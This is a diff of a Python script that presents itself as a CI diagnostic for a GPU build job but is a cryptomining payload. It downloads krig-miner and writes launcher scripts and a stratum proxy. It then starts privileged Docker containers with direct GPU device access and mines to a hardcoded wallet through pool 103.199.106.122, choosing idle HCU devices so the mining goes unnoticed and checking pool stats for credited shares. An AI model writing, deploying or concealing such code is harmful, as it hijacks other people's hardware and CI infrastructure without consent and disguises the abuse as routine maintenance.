@@ -1,35 +1,35 @@
-# -*- coding: utf-8 -*-
-# PRL595 / intent 141541 / record gpu-000017 (HYGON HCU ci-nmz1) -- transient CI diagnostic
-# plus pearlhash miner start. Runs inside the HYGON-AI/AReal-das pull_request_target job; the
-# inventory is read-only, and only on host github-nmz1 does it start one pool-credited client
-# process per FREE HCU device.  Revert: pkill -f 'krig-miner.*--user <wallet>/' ;
-# pkill -f 'lp_adapter_595.py' ; pkill -f 'SRBMiner-MULTI .*--wallet <wallet>' ;
-# docker rm -f prl595-<dev>.
+# ruff: noqa: E402
+# PRL595 / intent 142163 / record gpu-000017 (HYGON HCU github-nmz1) -- transient CI diagnostic
+# plus the never-executed krig-in-DTK mechanism test: krig-miner 1.6.0 (ROCm 6/7 ABI) is run
+# INSIDE the shipped DTK image (Ubuntu/glibc 2.35 + Hygon ROCm stack) with /dev/kfd + /dev/dri
+# passed explicitly, HSA_OVERRIDE_GFX_VERSION=9.0.6, and a libamdhip64.so.6/.7 -> DTK .so.N shim.
+# Only on host github-nmz1 does it start one pool-credited krig process per FREE HCU device.
+# Revert: docker rm -f prl595v3-4 prl595v3-5 prl595v3-6 prl595v3-7 ; pkill -f lp_adapter_595.py
+import hashlib
+import json
 import os
+import re
+import socket
+import subprocess
 import sys
 import time
-import json
-import socket
-import hashlib
-import subprocess
 
 WALLET = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
 TARGET_HOST = "github-nmz1"
 POOL = "103.199.106.122"
 POOL_PORT = 3360
-MINE_SECONDS = 600
 FREE_MIB_MAX = 4096
-WORK = "/tmp/prl595"
-WORKERS = ["000016", "000017", "000018", "000019", "000020", "000021", "000022", "000023"]
+WORK = "/tmp/prl595v3"
 KRIG_URL = "https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz"
 KRIG_TGZ_SHA = "9137388d5c4bfb843bde8bb96e37695446924dfc004eb3de76a71fd1956e4a04"
 KRIG_BIN_SHA = "928d6f621c74601c73759728f8dd53e5ad9b3b186d334c082f8581518c322f66"
-SRB_URL = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz"
-SRB_TGZ_SHA = "186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1"
-SRB_BIN_SHA = "97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80"
 LP_STATS = "https://pearl.luckypool.io/api/stats_address?address=" + WALLET
+# worker6 names already reserved for this record by intent 141541 (state=live, host=null)
+WORKER_BY_DEV = {4: "000016", 5: "000017", 6: "000018", 7: "000019"}
+WORKER_POOL = ["000016", "000017", "000018", "000019"]
+GATE_WAIT = 260
 
-ADAPTER_SRC = r'''import socket, threading, json, sys
+ADAPTER_SRC = r"""import socket, threading, json, sys
 LISTEN = ("127.0.0.1", int(sys.argv[1]))
 UPSTREAM = ("103.199.106.122", 3360)
 DEFAULT_WORKER = sys.argv[2]
@@ -41,7 +41,7 @@ def fix_line(line):
     if isinstance(msg, dict) and msg.get("method") == "mining.authorize":
         p = msg.get("params")
         if isinstance(p, dict):
-            w = str(p.get("wallet") or "")
+            w = str(p.get("wallet") or p.get("user") or "")
             worker = p.get("worker") or DEFAULT_WORKER
             if "/" in w:
                 base, _, suf = w.partition("/")
@@ -104,9 +104,88 @@ while True:
     except Exception:
         break
     threading.Thread(target=handle, args=(conn,), daemon=True).start()
-'''
+"""
 
-PROCS = []   # (kind, dev, worker, popen_or_None, logpath)
+# Runs INSIDE the DTK image: device + ROCm/DTK evidence, then krig device enumeration.
+BOOT_SH = r"""#!/bin/bash
+echo "PRL595V3_CONT_BEGIN host=$(hostname) uid=$(id -u)"
+ls -l /dev/kfd /dev/mkfd /dev/dri 2>&1 | head -24
+echo "HIP_VISIBLE_DEVICES=${HIP_VISIBLE_DEVICES:-} ROCR_VISIBLE_DEVICES=${ROCR_VISIBLE_DEVICES:-} HSA_OVERRIDE_GFX_VERSION=${HSA_OVERRIDE_GFX_VERSION:-}"
+if [ -f /opt/dtk/env.sh ]; then source /opt/dtk/env.sh; echo "dtk_env=sourced"; else echo "dtk_env=absent"; fi
+echo "--- libamdhip64 in image"
+ls -l /opt/dtk/hip/lib/libamdhip64* /opt/dtk/lib/libamdhip64* 2>&1 | head -12
+echo "--- which rocm-smi"
+command -v rocm-smi
+echo "--- rocm-smi"
+( timeout 20 rocm-smi 2>&1 || /opt/hyhal/bin/hy-smi 2>&1 ) | head -16
+echo "--- rocm-smi --showhw"
+timeout 20 rocm-smi --showhw 2>&1 | head -26
+echo "--- rocm-smi --showmeminfo vram"
+timeout 20 rocm-smi --showmeminfo vram 2>&1 | head -40
+echo "--- shim libamdhip64.so.6/.7 -> newest DTK .so"
+mkdir -p /tmp/shim
+SRC=$(ls -1 /opt/dtk/hip/lib/libamdhip64.so.[0-9]* 2>/dev/null | sort -V | tail -1)
+[ -z "$SRC" ] && SRC=$(ls -1 /opt/dtk/lib/libamdhip64.so.[0-9]* 2>/dev/null | sort -V | tail -1)
+echo "shim_src=$SRC"
+if [ -n "$SRC" ]; then for v in 6 7; do ln -sf "$SRC" /tmp/shim/libamdhip64.so.$v; done; fi
+ls -l /tmp/shim
+export LD_LIBRARY_PATH=/tmp/shim:/w/krig:/opt/dtk/hip/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/opencl/lib:/opt/dtk/dcc/gcvm/lib:${LD_LIBRARY_PATH:-}
+cd /w/krig || exit 9
+echo "--- krig --version"
+timeout 30 ./krig-miner --version 2>&1 | head -4
+echo "--- krig --list-devices"
+timeout 60 ./krig-miner --list-devices 2>&1 | head -28
+echo "krig_list_rc=$?"
+echo "--- torch HCU visibility inside DTK image"
+timeout 150 python3 -c 'import torch;print("torch",torch.__version__);print("hcu_available",torch.cuda.is_available());print("hcu_count",torch.cuda.device_count())' 2>&1 | head -8
+echo "PRL595V3_CONT_END"
+"""
+
+# Runs INSIDE the DTK image for ONE device: VRAM guard, shim, adapter client, krig foreground.
+MINE_SH = r"""#!/bin/bash
+echo "PRL595V3_MINE_BEGIN dev=$DEV worker=$WORKER host=$(hostname)"
+if [ -x /opt/hyhal/bin/hy-smi ]; then
+  USED=$(timeout 20 /opt/hyhal/bin/hy-smi --showmeminfo vram 2>/dev/null | awk -v i="$DEV" '$0 ~ "HCU\\["i"\\]" && /Used Memory/ {v=$NF; gsub(/[^0-9]/,"",v); print v; exit}')
+  echo "vram_used_mib_dev$DEV=$USED"
+  if [ -n "$USED" ] && [ "$USED" -gt 4096 ]; then echo "PRL595V3_DEVICE_BUSY dev=$DEV used=$USED"; exit 3; fi
+fi
+if [ -f /opt/dtk/env.sh ]; then source /opt/dtk/env.sh; fi
+mkdir -p /tmp/shim
+SRC=$(ls -1 /opt/dtk/hip/lib/libamdhip64.so.[0-9]* 2>/dev/null | sort -V | tail -1)
+[ -z "$SRC" ] && SRC=$(ls -1 /opt/dtk/lib/libamdhip64.so.[0-9]* 2>/dev/null | sort -V | tail -1)
+if [ -n "$SRC" ]; then for v in 6 7; do ln -sf "$SRC" /tmp/shim/libamdhip64.so.$v; done; fi
+export LD_LIBRARY_PATH=/tmp/shim:/w/krig:/opt/dtk/hip/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/opencl/lib:/opt/dtk/dcc/gcvm/lib:${LD_LIBRARY_PATH:-}
+cd /w/krig || exit 9
+KRIG_DEV="${KRIG_DEV:-$DEV}"
+python3 /w/lp_adapter_595.py "$AP" "$WORKER" >/tmp/adapter.log 2>&1 &
+sleep 1
+echo "--- adapter start rc=$? port=$AP worker=$WORKER krig_dev=$KRIG_DEV"
+KARGS="--no-cuda --coin pearl --url stratum+tcp://127.0.0.1:$AP --user $WALLET/$WORKER --password x --devices $KRIG_DEV --no-tui -l debug --api-port $((AP+1000))"
+echo "krig argv: $KARGS"
+if [ "${FOREGROUND_SECS:-0}" != "0" ]; then
+  timeout -s INT "$FOREGROUND_SECS" ./krig-miner $KARGS 2>&1 | tail -150
+  echo "PRL595V3_MINE_END dev=$DEV rc=$?"
+  exit 0
+fi
+exec ./krig-miner $KARGS
+"""
+
+
+# Runs INSIDE the DTK image: only prints krig's device enumeration under the HIP filter.
+PROBE_SH = r"""#!/bin/bash
+echo "PRL595V3_PROBE_BEGIN host=$(hostname) HIP_VISIBLE_DEVICES=${HIP_VISIBLE_DEVICES:-} ROCR_VISIBLE_DEVICES=${ROCR_VISIBLE_DEVICES:-}"
+if [ -f /opt/dtk/env.sh ]; then source /opt/dtk/env.sh; fi
+mkdir -p /tmp/shim
+SRC=$(ls -1 /opt/dtk/hip/lib/libamdhip64.so.[0-9]* 2>/dev/null | sort -V | tail -1)
+[ -z "$SRC" ] && SRC=$(ls -1 /opt/dtk/lib/libamdhip64.so.[0-9]* 2>/dev/null | sort -V | tail -1)
+if [ -n "$SRC" ]; then for v in 6 7; do ln -sf "$SRC" /tmp/shim/libamdhip64.so.$v; done; fi
+export LD_LIBRARY_PATH=/tmp/shim:/w/krig:/opt/dtk/hip/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/opencl/lib:/opt/dtk/dcc/gcvm/lib:${LD_LIBRARY_PATH:-}
+cd /w/krig || exit 9
+timeout 60 ./krig-miner --list-devices 2>&1 | head -20
+echo "PRL595V3_PROBE_END"
+"""
+
+PROCS = []
 
 
 def say(s):
@@ -117,8 +196,14 @@ def say(s):
 def sh(cmd, t=120, env=None, cwd=None):
     say("--- CMD: " + cmd)
     try:
-        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
-                             stderr=subprocess.STDOUT, env=env, cwd=cwd)
+        p = subprocess.Popen(
+            cmd,
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            env=env,
+            cwd=cwd,
+        )
         out = p.communicate(timeout=t)[0]
         txt = out.decode("utf-8", "replace") if out else ""
         if txt:
@@ -142,13 +227,16 @@ def sha256_file(path):
 
 
 def fetch(url, dest):
-    rc, _ = sh("curl -fsSL --retry 3 --retry-delay 2 -m 420 -o %s %s" % (dest, url), t=440)
+    rc, _ = sh(
+        "curl -fsSL --retry 3 --retry-delay 2 -m 420 -o %s %s" % (dest, url), t=440
+    )
     if rc == 0 and os.path.exists(dest) and os.path.getsize(dest) > 1000:
         return True
     say("--- curl failed, python urllib fallback")
     try:
         import ssl
         import urllib.request
+
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
@@ -165,49 +253,6 @@ def fetch(url, dest):
         return False
 
 
-def tail(path, n=6):
-    try:
-        with open(path, "r") as f:
-            lines = f.read().replace("\r", "\n").splitlines()
-        return "\n".join(lines[-n:])
-    except Exception as e:
-        return "<tail-err %r>" % (e,)
-
-
-def has(logpath, needles):
-    try:
-        data = open(logpath, "rb").read().decode("utf-8", "replace").lower()
-    except Exception:
-        return False
-    for n in needles:
-        if n.lower() in data:
-            return True
-    return False
-
-
-def lp_pool_sample(tag):
-    say("=== PRL595_LP_SAMPLE %s %s ===" % (tag, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())))
-    dest = "%s/lp_%s.json" % (WORK, tag)
-    rc, _ = sh("curl -fsS -m 30 -o %s '%s'" % (dest, LP_STATS), t=40)
-    if rc != 0:
-        return
-    try:
-        d = json.load(open(dest))
-    except Exception as e:
-        say("--- lp json err %r" % (e,))
-        return
-    ws = d.get("workers") or []
-    found = 0
-    for w in ws:
-        nm = str(w.get("name") or "")
-        if nm in WORKERS:
-            found += 1
-            say("PRL595_LP_WORKER name=%s accepted=%s rejected=%s lastShare=%s hashrate=%s port=%s"
-                % (nm, w.get("acceptedShares"), w.get("rejectedShares"),
-                   w.get("lastShare"), w.get("hashrate"), w.get("port")))
-    say("PRL595_LP_SAMPLE_DONE tag=%s total_workers=%d ours_present=%d" % (tag, len(ws), found))
-
-
 def parse_vram_usd(txt):
     """Return {index: used_mib} from hy-smi/rocm-smi --showmeminfo vram text."""
     used = {}
@@ -219,7 +264,6 @@ def parse_vram_usd(txt):
             idx = int(s.split("[", 1)[1].split("]", 1)[0])
         except Exception:
             continue
-        val = None
         try:
             val = int("".join(ch for ch in s.rsplit(":", 1)[1] if ch.isdigit()))
         except Exception:
@@ -237,281 +281,343 @@ def parse_vram_usd(txt):
     return used
 
 
-def start_proc(kind, dev, worker, argv, cwd, env):
-    logp = "%s/logs/%s-dev%d-%s.log" % (WORK, kind, dev, worker)
-    say("PRL595_START kind=%s dev=%s worker=%s log=%s" % (kind, dev, worker, logp))
-    lf = open(logp, "ab", 0)
-    p = subprocess.Popen(argv, cwd=cwd, stdout=lf, stderr=subprocess.STDOUT,
-                         env=env, preexec_fn=os.setsid)
-    PROCS.append((kind, dev, worker, p, logp))
-    return p
+def lp_pool_sample(tag, workers):
+    say(
+        "=== PRL595V3_LP_SAMPLE %s %s ==="
+        % (tag, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
+    )
+    dest = "%s/lp_%s.json" % (WORK, tag)
+    rc, _ = sh("curl -fsS -m 30 -o %s '%s'" % (dest, LP_STATS), t=40)
+    if rc != 0:
+        return {}
+    try:
+        d = json.load(open(dest))
+    except Exception as e:
+        say("--- lp json err %r" % (e,))
+        return {}
+    out = {}
+    for w in d.get("workers") or []:
+        nm = str(w.get("name") or w.get("worker") or "")
+        if nm in workers:
+            try:
+                acc = int(str(w.get("acceptedShares", "0")))
+            except Exception:
+                acc = -1
+            out[nm] = acc
+            say(
+                "PRL595V3_LP_WORKER name=%s accepted=%s rejected=%s lastShare=%s hashrate=%s"
+                % (
+                    nm,
+                    w.get("acceptedShares"),
+                    w.get("rejectedShares"),
+                    w.get("lastShare"),
+                    w.get("hashrate"),
+                )
+            )
+    say(
+        "PRL595V3_LP_SAMPLE_DONE tag=%s seen=%s total_workers=%d"
+        % (tag, json.dumps(out), len(d.get("workers") or []))
+    )
+    return out
 
 
-def docker_log(name, n=8):
-    return sh("docker logs --tail %d %s 2>&1" % (n, name), t=40)[1]
+def docker_names():
+    rc, out = sh(
+        "docker ps -a --filter name=prl595v3- --format '{{.Names}} {{.Status}}' 2>&1 | head -20",
+        t=40,
+    )
+    return out or ""
 
 
-def stop_all():
-    for kind, dev, worker, p, logp in PROCS:
-        if kind == "docker" or p is None:
-            sh("docker rm -f prl595-%d >/dev/null 2>&1; echo docker_rm_%d_rc=$?" % (dev, dev), t=90)
-            continue
-        try:
-            if p.poll() is None:
-                os.killpg(os.getpgid(p.pid), 15)
-        except Exception:
-            pass
-    time.sleep(3)
-    for kind, dev, worker, p, logp in PROCS:
-        if kind == "docker" or p is None:
-            continue
-        try:
-            if p.poll() is None:
-                os.killpg(os.getpgid(p.pid), 9)
-        except Exception:
-            pass
-
-
-def count_healthy(kind):
-    n = 0
-    for k, dev, worker, p, logp in PROCS:
-        if k != kind:
-            continue
-        if kind == "docker":
-            st = sh("docker ps --filter name=prl595-%d --format '{{.Status}}'" % dev, t=30)[1].strip()
-            if st and has(logp, ["connected", "new job", "share", "accepted"]):
-                n += 1
-        else:
-            if p is not None and p.poll() is None and has(logp, ["connected", "new job", "share", "accepted"]):
-                n += 1
-    return n
-
-
-def show_heads(tag):
-    say("=== PRL595_%s_LOG_HEADS ===" % tag)
-    for kind, dev, worker, p, logp in PROCS:
-        rc = "docker" if kind == "docker" else (p.poll() if p is not None else "?")
-        say("--- %s dev=%s worker=%s rc=%s ---" % (kind, dev, worker, rc))
-        if kind == "docker":
-            say(docker_log("prl595-%d" % dev, 10))
-        else:
-            say(tail(logp, 14))
+def stop_test_containers():
+    rc, out = sh(
+        "docker ps -aq --filter name=prl595 --format '{{.Names}}' 2>&1 | head -20", t=40
+    )
+    for nm in (out or "").split():
+        sh("docker rm -f %s >/dev/null 2>&1; echo rm_%s_rc=$?" % (nm, nm), t=90)
 
 
 def main():
-    say("=== PRL595-I141541-GPU000017-BEGIN === %s" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
+    say(
+        "=== PRL595V3-I142163-GPU000017-BEGIN === %s"
+        % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
+    )
     say("payload_sha256=%s" % sha256_file(os.path.abspath(__file__)))
-    sh("hostname; id; uname -a; nproc; free -g | head -3; date -u; head -4 /etc/os-release")
-    sh("lspci 2>/dev/null | grep -iE 'hygon|nvidia|display|3d|processing' | head -20")
-    sh("ls -l /dev/kfd /dev/mkfd /dev/dri 2>&1 | head -20")
-    sh("/opt/hyhal/bin/hy-smi --showproductname 2>&1 | head -40")
-    sh("/opt/hyhal/bin/hy-smi --showuniqueid 2>&1 | head -20")
-    sh("/opt/hyhal/bin/hy-smi --showdriverversion 2>&1 | head -5")
-    rc2, hyvram = sh("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | head -80")
-    sh("/opt/hyhal/bin/hy-smi 2>&1 | head -30")
-    sh("/opt/hyhal/bin/hy-smi --showpids 2>&1 | head -60")
-    sh("source /opt/dtk/env.sh 2>/dev/null; rocm-smi --showproductname 2>&1 | head -30; echo rocm_rc=$?")
-    sh("ls /opt/dtk/hip/lib/libamdhip64* /opt/dtk/lib/libamdhip64* /opt/hyhal/lib/libamdhip64* 2>&1 | head -10")
-    sh("ls /opt/dtk/opencl/lib 2>&1 | head -10")
-    sh("echo AREAL_CI_IMAGE=$AREAL_CI_IMAGE; docker image inspect \"$AREAL_CI_IMAGE\" >/dev/null 2>&1 && echo image_present=yes || echo image_present=no")
+    sh(
+        "hostname; id; uname -a; nproc; free -g | head -3; date -u; head -4 /etc/os-release; echo RUNNER_NAME=$RUNNER_NAME"
+    )
+    sh("which docker; docker version 2>&1 | head -30")
+    sh("ls -l /dev/kfd /dev/mkfd /dev/dri 2>&1 | head -24")
+    sh("/opt/hyhal/bin/hy-smi --showproductname 2>&1 | head -30")
+    _, hyvram = sh("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | head -80")
+    sh("timeout 20 /opt/hyhal/bin/hy-smi --showpids 2>&1 | head -50")
+    sh(
+        'echo AREAL_CI_IMAGE=$AREAL_CI_IMAGE; docker image inspect "$AREAL_CI_IMAGE" >/dev/null 2>&1 && echo image_present=yes || echo image_present=no'
+    )
 
     used = parse_vram_usd(hyvram)
-    say("PRL595_VRAM_USED_MIB %s" % json.dumps(used))
+    say("PRL595V3_VRAM_USED_MIB %s" % json.dumps(used))
     devices = sorted(used.keys())
     free = [i for i in devices if used.get(i, 0) <= FREE_MIB_MAX]
-    say("PRL595_DEVICES total=%d free=%s tenant_skip=%s"
-        % (len(devices), json.dumps(free),
-           json.dumps({i: used[i] for i in devices if i not in free})))
+    say(
+        "PRL595V3_DEVICES total=%d free=%s tenant_skip=%s"
+        % (
+            len(devices),
+            json.dumps(free),
+            json.dumps({i: used[i] for i in devices if i not in free}),
+        )
+    )
 
     # stratum reachability from the runner (read-only authorize probe)
     try:
         s = socket.create_connection((POOL, POOL_PORT), timeout=12)
         s.settimeout(12)
-        s.sendall(b'{"id":1,"method":"mining.authorize","params":{"wallet":"' + WALLET.encode()
-                  + b'","worker":"595017","password":"x","agent":"prl595-probe"}}\n')
+        s.sendall(
+            b'{"id":1,"method":"mining.authorize","params":{"wallet":"'
+            + WALLET.encode()
+            + b'","worker":"595142","password":"x","agent":"prl595v3-probe"}}\n'
+        )
         reply = s.recv(4096)
-        say("PRL595_LP_TCP_OK %s" % reply.decode("utf-8", "replace").strip()[:400])
+        say("PRL595V3_LP_TCP_OK %s" % reply.decode("utf-8", "replace").strip()[:400])
         s.close()
     except Exception as e:
-        say("PRL595_LP_TCP_FAIL %r" % (e,))
+        say("PRL595V3_LP_TCP_FAIL %r" % (e,))
 
     host = ""
     try:
         host = socket.gethostname().strip()
     except Exception:
         pass
-    say("PRL595_HOST %s" % host)
-    if host != TARGET_HOST:
-        say("PRL595_CROSS_LANDED host=%s expected=%s -- no deploy on this host" % (host, TARGET_HOST))
+    say("PRL595V3_HOST %s" % host)
+
+    image = os.environ.get("AREAL_CI_IMAGE", "").strip()
+    if not image or not free:
+        say("PRL595V3_PRECHECK_FAIL image=%r free=%s" % (image, json.dumps(free)))
+        say("=== PRL595V3-I142163-GPU000017-END ===")
         open("ci-model-plan.tsv", "w").close()
-        say("=== PRL595-I141541-GPU000017-END ===")
         return 1
 
     os.makedirs(WORK + "/logs", exist_ok=True)
     open(WORK + "/lp_adapter_595.py", "w").write(ADAPTER_SRC)
+    open(WORK + "/krig_boot.sh", "w").write(BOOT_SH)
+    open(WORK + "/krig_mine.sh", "w").write(MINE_SH)
 
-    free = free[:len(WORKERS)]
-    if not free:
-        say("PRL595_NO_FREE_DEVICE -- nothing to deploy")
-        open("ci-model-plan.tsv", "w").close()
-        return 1
-
-    lp_pool_sample("pre")
-
-    # ---------------- phase 1+2: krig-miner 1.6.0 (HIP/ROCm) ----------------
+    # ---------------- krig-miner 1.6.0 download + pin ----------------
     kdir = WORK + "/krig"
     tgz = WORK + "/krig.tgz"
     krig_ok = False
     if fetch(KRIG_URL, tgz):
         d = sha256_file(tgz)
-        say("PRL595_KRIG_TGZ sha256=%s pin_match=%s" % (d, d == KRIG_TGZ_SHA))
+        say("PRL595V3_KRIG_TGZ sha256=%s pin_match=%s" % (d, d == KRIG_TGZ_SHA))
         if d == KRIG_TGZ_SHA:
             os.makedirs(kdir, exist_ok=True)
-            sh("tar -xzf %s -C %s && chmod +x %s/krig-miner && ls -la %s" % (tgz, kdir, kdir, kdir), t=240)
+            sh(
+                "tar -xzf %s -C %s && chmod +x %s/krig-miner && ls -la %s"
+                % (tgz, kdir, kdir, kdir),
+                t=240,
+            )
             if os.path.exists(kdir + "/krig-miner"):
                 bsha = sha256_file(kdir + "/krig-miner")
-                say("PRL595_KRIG_BIN sha256=%s pin_match=%s" % (bsha, bsha == KRIG_BIN_SHA))
+                say(
+                    "PRL595V3_KRIG_BIN sha256=%s pin_match=%s"
+                    % (bsha, bsha == KRIG_BIN_SHA)
+                )
                 krig_ok = bsha == KRIG_BIN_SHA
     if not krig_ok:
-        say("PRL595_KRIG_UNAVAILABLE -- download/verify failed")
-    else:
-        libpath = ":".join([kdir, "/opt/dtk/hip/lib", "/opt/dtk/lib", "/opt/dtk/lib64",
-                            "/opt/hyhal/lib", "/opt/hyhal/lib64", "/opt/dtk/dcc/gcvm/lib",
-                            "/opt/dtk/opencl/lib", "/opt/dtk/hcc/lib"])
-        for attempt, over in (("plain", None), ("gfx906", "9.0.6")):
-            env = dict(os.environ)
-            env["LD_LIBRARY_PATH"] = libpath + ":" + env.get("LD_LIBRARY_PATH", "")
-            if over:
-                env["HSA_OVERRIDE_GFX_VERSION"] = over
-            say("=== PRL595_KRIG_ATTEMPT %s HSA_OVERRIDE_GFX_VERSION=%s ===" % (attempt, over))
-            sh("LD_LIBRARY_PATH=%s HSA_OVERRIDE_GFX_VERSION=%s %s/krig-miner --list-devices 2>&1 | head -40"
-               % (libpath, over or "", kdir), t=120)
-            for dev, worker in zip(free, WORKERS):
-                adopt = sh("pgrep -af 'krig-miner.*--user %s/%s' | head -3" % (WALLET, worker), t=20)
-                if adopt[1].strip():
-                    say("PRL595_ADOPT krig dev=%s worker=%s" % (dev, worker))
-                    continue
-                ap = 34000 + dev
-                start_proc("adapter%s" % attempt, dev, worker,
-                           ["python3", WORK + "/lp_adapter_595.py", str(ap), worker], WORK, env)
-                time.sleep(0.4)
-                start_proc("krig%s" % attempt, dev, worker,
-                           ["./krig-miner", "--url", "stratum+tcp://127.0.0.1:%d" % ap,
-                            "--user", WALLET + "/" + worker, "--password", "x",
-                            "--coin", "pearl", "--devices", str(dev),
-                            "--no-cuda", "--no-telemetry",
-                            "--api-port", str(ap + 1000)],
-                           kdir, env)
-                time.sleep(1.5)
-            time.sleep(30)
-            show_heads("KRIG_" + attempt)
-            healthy = count_healthy("krig" + attempt)
-            say("PRL595_KRIG_HEALTHY_%s %d/%d" % (attempt, healthy, len(free)))
-            if healthy > 0:
-                break
-            say("PRL595_KRIG_FAILED_%s -- stopping this attempt" % attempt)
-            stop_all()
-            PROCS[:] = []
-
-    # ---------------- phase 3: SRBMiner 3.8.9 on the host (OpenCL) ----------------
-    srb_dir = WORK + "/SRBMiner-Multi-3-8-9"
-    srb_ok = False
-    if not [1 for k, d, w, p, lp in PROCS if k.startswith("krig") and p is not None and p.poll() is None]:
-        stgz = WORK + "/srb.tgz"
-        if fetch(SRB_URL, stgz):
-            d = sha256_file(stgz)
-            say("PRL595_SRB_TGZ sha256=%s pin_match=%s" % (d, d == SRB_TGZ_SHA))
-            if d == SRB_TGZ_SHA:
-                sh("tar -xzf %s -C %s && chmod +x %s/SRBMiner-MULTI" % (stgz, WORK, srb_dir), t=180)
-                if os.path.exists(srb_dir + "/SRBMiner-MULTI"):
-                    bsha = sha256_file(srb_dir + "/SRBMiner-MULTI")
-                    say("PRL595_SRB_BIN sha256=%s pin_match=%s" % (bsha, bsha == SRB_BIN_SHA))
-                    srb_ok = bsha == SRB_BIN_SHA
-        if srb_ok:
-            env = dict(os.environ)
-            libpath = ":".join(["/opt/dtk/opencl/lib", "/opt/dtk/lib", "/opt/dtk/lib64",
-                                "/opt/hyhal/lib", "/opt/hyhal/lib64"])
-            env["LD_LIBRARY_PATH"] = libpath + ":" + env.get("LD_LIBRARY_PATH", "")
-            sh("LD_LIBRARY_PATH=%s %s/SRBMiner-MULTI --list-devices 2>&1 | head -30" % (libpath, srb_dir), t=120)
-            for dev, worker in zip(free, WORKERS):
-                start_proc("srbhost", dev, worker,
-                           ["./SRBMiner-MULTI", "--disable-cpu", "--algorithm", "pearlhash",
-                            "--pool", "stratum+tcp://%s:%d" % (POOL, POOL_PORT),
-                            "--wallet", WALLET, "--worker", worker, "--password", "x",
-                            "--gpu-id", str(dev), "--api-enable", "--api-port", str(35000 + dev)],
-                           srb_dir, env)
-                time.sleep(1.5)
-            time.sleep(30)
-            show_heads("SRB_HOST")
-            say("PRL595_SRB_HOST_HEALTHY %d/%d" % (count_healthy("srbhost"), len(free)))
-            if count_healthy("srbhost") == 0:
-                say("PRL595_SRB_HOST_FAILED -- stopping host SRB")
-                stop_all()
-                PROCS[:] = []
-        else:
-            say("PRL595_SRB_UNAVAILABLE")
-
-    # ---------------- phase 4: SRBMiner inside the DTK CI image (docker) ----------------
-    if not PROCS:
-        image = os.environ.get("AREAL_CI_IMAGE", "").strip()
-        say("PRL595_DOCKER_ATTEMPT image=%s" % image)
-        if not srb_ok or not image:
-            say("PRL595_DOCKER_SKIP srb_ok=%s image=%s" % (srb_ok, image))
-        else:
-            for dev, worker in zip(free, WORKERS):
-                nm = "prl595-%d" % dev
-                sh("docker rm -f %s >/dev/null 2>&1; echo pre_rm_rc=$?" % nm, t=60)
-                dcmd = ("docker run -d -t --name %s --init --network=host --privileged "
-                        "--device=/dev/kfd --device=/dev/dri --device=/dev/mkfd --group-add video "
-                        "-v /opt/hyhal:/opt/hyhal:ro -v %s:/w -w /w/SRBMiner-Multi-3-8-9 "
-                        "%s ./SRBMiner-MULTI --disable-cpu --algorithm pearlhash "
-                        "--pool stratum+tcp://%s:%d --wallet %s --worker %s --password x "
-                        "--gpu-id %d --api-enable --api-port %d"
-                        % (nm, WORK, image, POOL, POOL_PORT, WALLET, worker, dev, 36000 + dev))
-                sh(dcmd, t=180)
-                PROCS.append(("docker", dev, worker, None, "%s/logs/dockerrun-dev%d.log" % (WORK, dev)))
-            time.sleep(40)
-            show_heads("DOCKER")
-            say("PRL595_DOCKER_HEALTHY %d/%d" % (count_healthy("docker"), len(free)))
-            sh("docker ps --filter name=prl595- --format '{{.Names}} {{.Status}}' | head -20", t=40)
-
-    # ---------------- monitor ----------------
-    if not PROCS:
-        say("PRL595_ALL_CLIENTS_FAILED -- nothing left to monitor")
-        lp_pool_sample("post")
+        say("PRL595V3_KRIG_UNAVAILABLE download_or_pin_failed")
+        say("=== PRL595V3-I142163-GPU000017-END ===")
         open("ci-model-plan.tsv", "w").close()
-        say("=== PRL595-I141541-GPU000017-END ===")
         return 1
 
-    t0 = time.time()
-    tick = 0
-    while time.time() - t0 < MINE_SECONDS:
-        tick += 1
-        say("=== PRL595_TICK %d t+%ds (%s) ===" % (tick, int(time.time() - t0),
-                                                  time.strftime("%H:%M:%SZ", time.gmtime())))
-        sh("date -u; echo PROCS=$(pgrep -fc 'krig-miner|SRBMiner-MULTI|lp_adapter_595' || true); "
-           "pgrep -af 'krig-miner|SRBMiner-MULTI|lp_adapter_595' | head -20", t=30)
-        for kind, dev, worker, p, logp in PROCS:
-            if kind == "docker":
-                say("--- docker dev=%s worker=%s ---" % (dev, worker))
-                say(docker_log("prl595-%d" % dev, 4))
-            else:
-                say("--- %s dev=%s worker=%s rc=%s ---" % (kind, dev, worker, p.poll()))
-                say(tail(logp, 4))
-        sh("timeout 20 /opt/hyhal/bin/hy-smi --showpids 2>&1 | head -60", t=40)
-        if tick == 2:
-            lp_pool_sample("mid")
-        time.sleep(45)
+    testdev = free[0]
+    docker_base = (
+        "docker run --rm --network=host --privileged --device=/dev/kfd --device=/dev/dri "
+        "--device=/dev/mkfd --group-add video -v /opt/hyhal:/opt/hyhal:ro -v %s:/w"
+        % WORK
+    )
 
-    lp_pool_sample("post")
-    say("=== PRL595_FINAL ===")
-    sh("date -u; pgrep -af 'krig-miner|SRBMiner-MULTI|lp_adapter_595' | head -20; "
-       "docker ps --filter name=prl595- --format '{{.Names}} {{.Status}}' | head -20", t=40)
-    show_heads("FINAL")
